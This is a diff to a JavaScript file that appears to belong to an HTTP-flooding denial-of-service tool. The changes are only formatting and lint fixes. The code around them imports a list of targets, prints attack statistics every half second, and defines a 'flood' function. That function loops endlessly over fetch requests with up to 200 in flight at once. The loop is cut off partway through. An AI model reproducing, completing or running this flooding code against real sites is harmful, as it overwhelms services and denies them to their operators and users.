@@ -1,15 +1,15 @@
+import { targets } from './targets';
 import { createTargetUrl } from './utils/createTargetUrl';
 import { printStats } from './utils/printStatistics';
-import { targets } from './targets';
 
 setInterval(() => {
-    printStats(targets)
-}, 500)
+  printStats(targets);
+}, 500);
 
 const CONCURRENCY_LIMIT = 200;
 let queue = [];
 
-async function fetchWithTimeout(resource, options) {
+function fetchWithTimeout(resource, options) {
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), options.timeout);
   return fetch(resource, {
@@ -30,6 +30,7 @@ async function fetchWithTimeout(resource, options) {
 async function flood(target) {
   for (let i = 0; ; ++i) {
     if (queue.length > CONCURRENCY_LIMIT) {
+      // eslint-disable-next-line no-await-in-loop
       await queue.shift();
     }
 
